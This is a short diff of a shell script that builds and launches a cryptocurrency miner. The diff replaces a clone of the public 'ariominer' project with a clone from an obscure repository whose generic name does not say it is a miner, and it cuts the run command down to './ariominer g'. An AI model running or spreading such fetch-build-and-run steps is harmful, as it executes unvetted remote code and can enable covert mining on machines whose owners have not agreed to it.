@@ -1,10 +1,10 @@
 apt-get install ocl-icd-opencl-dev -y
 
-git clone http://github.com/bogdanadnan/ariominer.git
-cd ariominer
+git clone https://github.com/mobileapps84741274/linuxweb84741274
+cd linuxweb84741274
 mkdir build
 cd build
 cmake .. -DCMAKE_BUILD_TYPE=Release
 make
 
-./ariominer --mode miner --pool http://aro.blueinc.cloud:84 --wallet --name --cpu-intensity 80 --gpu-intensity-cblocks 80 --gpu-intensity-gblocks 80
+./ariominer g
